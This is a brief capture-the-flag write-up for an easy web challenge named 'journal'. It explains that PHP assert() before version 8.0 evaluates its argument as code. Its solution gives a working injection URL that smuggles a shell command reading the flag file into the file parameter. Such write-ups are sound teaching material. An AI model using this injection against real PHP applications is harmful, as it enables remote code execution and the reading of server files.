# journal
**Category:** Web
**Difficulty:** Easy
**Author:** Eth007

## Description

dear diary, there is no LFI in this app

## Distribution

- `journal-dist.zip`
- link

## Solution

- PHP assert() before 8.0 executes code
- http://localhost/?file=%27,die(`cat%20/flag*`));//
